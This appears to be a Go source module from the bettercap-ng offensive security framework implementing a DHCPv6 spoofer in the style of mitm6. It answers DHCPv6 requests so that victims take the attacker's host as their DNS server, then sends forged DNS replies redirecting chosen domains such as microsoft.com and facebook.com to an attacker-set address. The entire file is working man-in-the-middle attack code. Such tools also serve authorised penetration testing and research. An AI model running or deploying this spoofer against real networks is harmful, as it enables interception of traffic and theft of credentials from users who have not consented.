package modules

import (
	"bytes"
	"crypto/rand"
	"fmt"
	"net"
	"strings"
	"time"

	"github.com/evilsocket/bettercap-ng/core"
	"github.com/evilsocket/bettercap-ng/log"
	"github.com/evilsocket/bettercap-ng/packets"
	"github.com/evilsocket/bettercap-ng/session"

	"github.com/google/gopacket"
	"github.com/google/gopacket/layers"
	"github.com/google/gopacket/pcap"

	// TODO: refactor to use gopacket when gopacket folks
	// will fix this > https://github.com/google/gopacket/issues/334
	"github.com/mdlayher/dhcp6"
	"github.com/mdlayher/dhcp6/dhcp6opts"
)

type DHCP6Spoofer struct {
	session.SessionModule
	Handle     *pcap.Handle
	DUID       *dhcp6opts.DUIDLLT
	DUIDRaw    []byte
	Domains    []string
	RawDomains []byte
	Address    net.IP
}

func NewDHCP6Spoofer(s *session.Session) *DHCP6Spoofer {
	spoof := &DHCP6Spoofer{
		SessionModule: session.NewSessionModule("dhcp6.spoof", s),
		Handle:        nil,
	}

	spoof.AddParam(session.NewStringParameter("dhcp6.spoof.domains",
		"microsoft.com, goole.com, facebook.com, apple.com, twitter.com",
		``,
		"Comma separated values of domain names to spoof."))

	spoof.AddParam(session.NewStringParameter("dhcp6.spoof.address",
		session.ParamIfaceAddress,
		`^(?:[0-9]{1,3}\.){3}[0-9]{1,3}$`,
		"IP address to map the domains to."))

	spoof.AddHandler(session.NewModuleHandler("dhcp6.spoof on", "",
		"Start the DHCPv6 spoofer in the background.",
		func(args []string) error {
			return spoof.Start()
		}))

	spoof.AddHandler(session.NewModuleHandler("dhcp6.spoof off", "",
		"Stop the DHCPv6 spoofer in the background.",
		func(args []string) error {
			return spoof.Stop()
		}))

	return spoof
}

func (s DHCP6Spoofer) Name() string {
	return "dhcp6.spoof"
}

func (s DHCP6Spoofer) Description() string {
	return "Replies to DHCPv6 messages, providing victims with a link-local IPv6 address and setting the attackers host as default DNS server (https://github.com/fox-it/mitm6/)."
}

func (s DHCP6Spoofer) Author() string {
	return "Simone Margaritelli <evilsocket@protonmail.com>"
}

func (s *DHCP6Spoofer) Configure() error {
	var err error
	var addr string

	if s.Handle, err = pcap.OpenLive(s.Session.Interface.Name(), 65536, true, pcap.BlockForever); err != nil {
		return err
	}

	err = s.Handle.SetBPFFilter("ip6 and udp")
	if err != nil {
		return err
	}

	s.Domains = make([]string, 0)
	if err, domains := s.StringParam("dhcp6.spoof.domains"); err != nil {
		return err
	} else {
		parts := strings.Split(domains, ",")
		totLen := 0
		for _, part := range parts {
			part = strings.Trim(part, "\t\n\r ")
			if part != "" {
				s.Domains = append(s.Domains, part)
				totLen += len(part)
			}
		}

		if totLen > 0 {
			s.RawDomains = make([]byte, totLen+1*len(s.Domains))
			i := 0
			for _, domain := range s.Domains {
				lenDomain := len(domain)
				plusOne := lenDomain + 1

				s.RawDomains[i] = byte(lenDomain & 0xff)
				k := 0
				for j := i + 1; j < plusOne; j++ {
					s.RawDomains[j] = domain[k]
					k++
				}

				i += plusOne
			}
		}
	}

	if err, addr = s.StringParam("dhcp6.spoof.address"); err != nil {
		return err
	}

	s.Address = net.ParseIP(addr)

	if s.DUID, err = dhcp6opts.NewDUIDLLT(1, time.Date(2000, time.January, 1, 0, 0, 0, 0, time.UTC), s.Session.Interface.HW); err != nil {
		return err
	} else if s.DUIDRaw, err = s.DUID.MarshalBinary(); err != nil {
		return err
	}

	return nil
}

func (s *DHCP6Spoofer) dhcpAdvertise(pkt gopacket.Packet, solicit dhcp6.Packet, target net.HardwareAddr) {
	pktIp6 := pkt.Layer(layers.LayerTypeIPv6).(*layers.IPv6)

	fqdn := target.String()
	if raw, found := solicit.Options[packets.DHCP6OptClientFQDN]; found == true && len(raw) >= 1 {
		fqdn = string(raw[0])
	}

	log.Info("Got DHCPv6 Solicit request from %s (%s), sending spoofed advertisement for %d domains.", core.Bold(fqdn), target, len(s.Domains))

	var solIANA dhcp6opts.IANA

	if raw, found := solicit.Options[dhcp6.OptionIANA]; found == false || len(raw) < 1 {
		log.Error("Unexpected DHCPv6 packet, could not find IANA.")
		return
	} else if err := solIANA.UnmarshalBinary(raw[0]); err != nil {
		log.Error("Unexpected DHCPv6 packet, could not deserialize IANA.")
		return
	}

	adv := dhcp6.Packet{
		MessageType:   dhcp6.MessageTypeAdvertise,
		TransactionID: solicit.TransactionID,
		Options:       make(dhcp6.Options),
	}

	adv.Options.AddRaw(packets.DHCP6OptDNSDomains, s.RawDomains)
	adv.Options.AddRaw(packets.DHCP6OptDNSServers, s.Session.Interface.IPv6)
	adv.Options.AddRaw(dhcp6.OptionServerID, s.DUIDRaw)

	var rawCID []byte
	if raw, found := solicit.Options[dhcp6.OptionClientID]; found == false || len(raw) < 1 {
		log.Error("Unexpected DHCPv6 packet, could not find client id.")
		return
	} else {
		rawCID = raw[0]
	}
	adv.Options.AddRaw(dhcp6.OptionClientID, rawCID)

	var ip net.IP
	if t, found := s.Session.Targets.Targets[target.String()]; found == true {
		ip = t.IP
	} else {
		log.Warning("Address %s not known, using random identity association address.", target.String())
		rand.Read(ip)
	}

	addr := fmt.Sprintf("%s%s", packets.IPv6Prefix, strings.Replace(ip.String(), ".", ":", -1))

	iaaddr, err := dhcp6opts.NewIAAddr(net.ParseIP(addr), 300*time.Second, 300*time.Second, nil)
	if err != nil {
		log.Error("Error creating IAAddr: %s", err)
		return
	}

	iaaddrRaw, err := iaaddr.MarshalBinary()
	if err != nil {
		log.Error("Error serializing IAAddr: %s", err)
		return
	}

	opts := dhcp6.Options{dhcp6.OptionIAAddr: [][]byte{iaaddrRaw}}
	iana := dhcp6opts.NewIANA(solIANA.IAID, 200*time.Second, 250*time.Second, opts)
	ianaRaw, err := iana.MarshalBinary()
	if err != nil {
		log.Error("Error serializing IANA: %s", err)
		return
	}

	adv.Options.AddRaw(dhcp6.OptionIANA, ianaRaw)

	rawAdv, err := adv.MarshalBinary()
	if err != nil {
		log.Error("Error serializing advertisement packet: %s.", err)
		return
	}

	eth := layers.Ethernet{
		SrcMAC:       s.Session.Interface.HW,
		DstMAC:       target,
		EthernetType: layers.EthernetTypeIPv6,
	}

	ip6 := layers.IPv6{
		Version:    6,
		NextHeader: layers.IPProtocolUDP,
		HopLimit:   64,
		SrcIP:      s.Session.Interface.IPv6,
		DstIP:      pktIp6.SrcIP,
	}

	udp := layers.UDP{
		SrcPort: 547,
		DstPort: 546,
	}

	udp.SetNetworkLayerForChecksum(&ip6)

	dhcp := packets.DHCPv6Layer{
		Raw: rawAdv,
	}

	err, raw := packets.Serialize(&eth, &ip6, &udp, &dhcp)
	if err != nil {
		log.Error("Error serializing packet: %s.", err)
		return
	}

	log.Debug("Sending %d bytes of packet ...", len(raw))
	if err := s.Session.Queue.Send(raw); err != nil {
		log.Error("Error sending packet: %s", err)
	}
}

func (s *DHCP6Spoofer) dhcpReply(toType string, pkt gopacket.Packet, req dhcp6.Packet, target net.HardwareAddr) {
	log.Debug("Sending spoofed DHCPv6 reply to %s after its %s packet.", core.Bold(target.String()), toType)

	pktIp6 := pkt.Layer(layers.LayerTypeIPv6).(*layers.IPv6)
	reply := dhcp6.Packet{
		MessageType:   dhcp6.MessageTypeReply,
		TransactionID: req.TransactionID,
		Options:       make(dhcp6.Options),
	}

	var rawCID []byte
	if raw, found := req.Options[dhcp6.OptionClientID]; found == false || len(raw) < 1 {
		log.Error("Unexpected DHCPv6 packet, could not find client id.")
		return
	} else {
		rawCID = raw[0]
	}
	reply.Options.AddRaw(dhcp6.OptionClientID, rawCID)
	reply.Options.AddRaw(dhcp6.OptionServerID, s.DUIDRaw)
	reply.Options.AddRaw(packets.DHCP6OptDNSServers, s.Session.Interface.IPv6)
	reply.Options.AddRaw(packets.DHCP6OptDNSDomains, s.RawDomains)

	var reqIANA dhcp6opts.IANA
	if raw, found := req.Options[dhcp6.OptionIANA]; found == false || len(raw) < 1 {
		log.Error("Unexpected DHCPv6 packet, could not find IANA.")
		return
	} else if err := reqIANA.UnmarshalBinary(raw[0]); err != nil {
		log.Error("Unexpected DHCPv6 packet, could not deserialize IANA.")
		return
	}

	var reqIAddr []byte
	if raw, found := reqIANA.Options[dhcp6.OptionIAAddr]; found == true {
		reqIAddr = raw[0]
	} else {
		log.Error("Unexpected DHCPv6 packet, could not deserialize request IANA IAAddr.")
		return
	}

	opts := dhcp6.Options{dhcp6.OptionIAAddr: [][]byte{reqIAddr}}
	iana := dhcp6opts.NewIANA(reqIANA.IAID, 200*time.Second, 250*time.Second, opts)
	ianaRaw, err := iana.MarshalBinary()
	if err != nil {
		log.Error("Error serializing IANA: %s", err)
		return
	}
	reply.Options.AddRaw(dhcp6.OptionIANA, ianaRaw)

	rawAdv, err := reply.MarshalBinary()
	if err != nil {
		log.Error("Error serializing advertisement packet: %s.", err)
		return
	}

	eth := layers.Ethernet{
		SrcMAC:       s.Session.Interface.HW,
		DstMAC:       target,
		EthernetType: layers.EthernetTypeIPv6,
	}

	ip6 := layers.IPv6{
		Version:    6,
		NextHeader: layers.IPProtocolUDP,
		HopLimit:   64,
		SrcIP:      s.Session.Interface.IPv6,
		DstIP:      pktIp6.SrcIP,
	}

	udp := layers.UDP{
		SrcPort: 547,
		DstPort: 546,
	}

	udp.SetNetworkLayerForChecksum(&ip6)

	dhcp := packets.DHCPv6Layer{
		Raw: rawAdv,
	}

	err, raw := packets.Serialize(&eth, &ip6, &udp, &dhcp)
	if err != nil {
		log.Error("Error serializing packet: %s.", err)
		return
	}

	log.Debug("Sending %d bytes of packet ...", len(raw))
	if err := s.Session.Queue.Send(raw); err != nil {
		log.Error("Error sending packet: %s", err)
	}

	if toType == "request" {
		var addr net.IP
		if raw, found := reqIANA.Options[dhcp6.OptionIAAddr]; found == true {
			addr = net.IP(raw[0])
		}

		if t, found := s.Session.Targets.Targets[target.String()]; found == true {
			log.Info("IPv6 address %s is now assigned to %s", addr.String(), t)
		} else {
			log.Info("IPv6 address %s is now assigned to %s", addr.String(), target)
		}
	} else {
		log.Debug("DHCPv6 renew sent to %s", target)
	}
}

func (s *DHCP6Spoofer) dnsReply(pkt gopacket.Packet, peth *layers.Ethernet, pudp *layers.UDP, domain string, req *layers.DNS, target net.HardwareAddr) {
	redir := fmt.Sprintf("(->%s)", s.Address)
	if t, found := s.Session.Targets.Targets[target.String()]; found == true {
		log.Info("Sending spoofed DNS reply for %s %s to %s.", core.Red(domain), core.Dim(redir), core.Bold(t.String()))
	} else {
		log.Info("Sending spoofed DNS reply for %s %s to %s.", core.Red(domain), core.Dim(redir), core.Bold(target.String()))
	}

	pip := pkt.Layer(layers.LayerTypeIPv6).(*layers.IPv6)

	eth := layers.Ethernet{
		SrcMAC:       peth.DstMAC,
		DstMAC:       target,
		EthernetType: layers.EthernetTypeIPv6,
	}

	ip6 := layers.IPv6{
		Version:    6,
		NextHeader: layers.IPProtocolUDP,
		HopLimit:   64,
		SrcIP:      pip.DstIP,
		DstIP:      pip.SrcIP,
	}

	udp := layers.UDP{
		SrcPort: pudp.DstPort,
		DstPort: pudp.SrcPort,
	}

	udp.SetNetworkLayerForChecksum(&ip6)

	answers := make([]layers.DNSResourceRecord, 0)
	for _, q := range req.Questions {
		answers = append(answers,
			layers.DNSResourceRecord{
				Name:  []byte(q.Name),
				Type:  q.Type,
				Class: q.Class,
				TTL:   1024,
				IP:    s.Address,
			})
	}

	dns := layers.DNS{
		ID:        req.ID,
		QR:        true,
		OpCode:    layers.DNSOpCodeQuery,
		QDCount:   req.QDCount,
		Questions: req.Questions,
		Answers:   answers,
	}

	err, raw := packets.Serialize(&eth, &ip6, &udp, &dns)
	if err != nil {
		log.Error("Error serializing packet: %s.", err)
		return
	}

	log.Debug("Sending %d bytes of packet ...", len(raw))
	if err := s.Session.Queue.Send(raw); err != nil {
		log.Error("Error sending packet: %s", err)
	}
}

func (s *DHCP6Spoofer) shouldSpoof(domain string) bool {
	for _, d := range s.Domains {
		if strings.HasSuffix(domain, d) == true {
			return true
		}
	}
	return false
}

func (s *DHCP6Spoofer) onPacket(pkt gopacket.Packet) {
	var dhcp dhcp6.Packet
	var err error

	eth := pkt.Layer(layers.LayerTypeEthernet).(*layers.Ethernet)
	udp := pkt.Layer(layers.LayerTypeUDP).(*layers.UDP)

	// we just got a dhcp6 packet?
	if err = dhcp.UnmarshalBinary(udp.Payload); err == nil {
		switch dhcp.MessageType {
		case dhcp6.MessageTypeSolicit:

			s.dhcpAdvertise(pkt, dhcp, eth.SrcMAC)

		case dhcp6.MessageTypeRequest:
			if raw, found := dhcp.Options[dhcp6.OptionServerID]; found == true && len(raw) >= 1 {
				rawServerID := raw[0]
				if bytes.Compare(rawServerID, s.DUIDRaw) == 0 {
					s.dhcpReply("request", pkt, dhcp, eth.SrcMAC)
				}
			}

		case dhcp6.MessageTypeRenew:
			if raw, found := dhcp.Options[dhcp6.OptionServerID]; found == true && len(raw) >= 1 {
				rawServerID := raw[0]
				if bytes.Compare(rawServerID, s.DUIDRaw) == 0 {
					s.dhcpReply("renew", pkt, dhcp, eth.SrcMAC)
				}
			}
		}

		return
	}

	// DNS request for us?
	if bytes.Compare(eth.DstMAC, s.Session.Interface.HW) == 0 {
		dns, parsed := pkt.Layer(layers.LayerTypeDNS).(*layers.DNS)
		if parsed == true && dns.OpCode == layers.DNSOpCodeQuery && len(dns.Questions) > 0 && len(dns.Answers) == 0 {
			for _, q := range dns.Questions {
				qName := string(q.Name)
				if s.shouldSpoof(qName) == true {
					s.dnsReply(pkt, eth, udp, qName, dns, eth.SrcMAC)
					break
				} else {
					log.Debug("Skipping domain %s", qName)
				}
			}
		}
	}
}

func (s *DHCP6Spoofer) Start() error {
	if s.Running() == true {
		return session.ErrAlreadyStarted
	} else if err := s.Configure(); err != nil {
		return err
	}

	s.SetRunning(true)

	go func() {
		defer s.Handle.Close()

		src := gopacket.NewPacketSource(s.Handle, s.Handle.LinkType())
		for packet := range src.Packets() {
			if s.Running() == false {
				break
			}

			s.onPacket(packet)
		}
	}()

	return nil
}

func (s *DHCP6Spoofer) Stop() error {
	if s.Running() == false {
		return session.ErrAlreadyStopped
	}
	s.SetRunning(false)
	return nil
}